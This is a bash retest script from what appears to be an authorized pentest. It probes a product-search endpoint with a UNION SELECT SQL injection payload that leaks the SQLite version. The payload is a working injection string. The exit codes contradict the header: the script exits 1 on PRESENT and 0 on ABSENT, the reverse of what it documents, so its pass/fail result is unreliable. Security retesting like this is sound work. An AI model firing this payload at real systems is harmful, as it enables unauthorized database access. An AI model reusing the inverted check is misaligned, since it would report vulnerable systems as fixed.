#!/bin/bash
# F-01 — Unauthenticated SQL injection in product search (UNION SELECT)
# Exit 0 = finding present · 1 = absent/fixed · 2 = rig error
# Safety: one GET, read-only. ROE 2026-10-27. Target: authorized lab host only.
set -u
BASE="${BASE:-http://127.0.0.1:3000}"
UA="Forefront-Retest/1.0 (ROE 2026-10-27)"

code=$(curl -sS --max-time 15 -A "$UA" -o /dev/null -w '%{http_code}' "$BASE/") \
  || { echo "RIG ERROR: liveness GET / failed"; exit 2; }
case "$code" in 2*|3*) ;; *) echo "RIG ERROR: liveness HTTP $code"; exit 2 ;; esac

body=$(curl -sS --max-time 15 -A "$UA" --get \
  --data-urlencode "q=')) UNION SELECT sqlite_version(),'1','2','3','4','5','6','7','8','9'--" \
  "$BASE/rest/products/search") || { echo "RIG ERROR: search request failed"; exit 2; }

# Injected row carries the literal name "1" in the 2nd column; a clean result never contains it.
if printf '%s' "$body" | grep -q '"name":"1"'; then
  echo "PRESENT: UNION SELECT injected a row (sqlite_version leaked)"
  exit 1
fi
echo "ABSENT: no injected row returned"
exit 0
